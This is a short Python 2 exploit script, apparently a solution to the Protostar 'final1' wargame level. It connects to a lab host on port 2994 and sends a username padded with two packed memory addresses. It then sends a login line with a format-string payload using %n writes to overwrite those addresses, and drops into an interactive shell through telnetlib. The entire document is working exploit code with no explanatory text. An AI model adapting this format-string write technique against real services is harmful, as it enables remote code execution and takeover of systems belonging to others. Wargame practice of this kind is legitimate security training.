import struct
import socket
import telnetlib

IP = "192.168.1.70"
PORT = 2994

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

def recv_until(check):
	buffer = ''
	while check not in buffer:
		buffer += s.recv(1)
	return buffer

ip2, port2 = s.getsockname()
hostname = ip2 + ":" + str(port2)

print recv_until("[final1] $ ")
first = "username " + "A"*(24-len(hostname)) + struct.pack("<L", 0x0804a1a8) + struct.pack("<L", 0x0804a1aa) + "\n"
s.send(first)
print recv_until("[final1] $ ")
second = "login " + "%17$65391x" + "%17$n" + "%18$47164x" + "%18$n" + "\n"
s.send(second)
print s.recv(1024)
t = telnetlib.Telnet()
t.sock = s
t.interact()
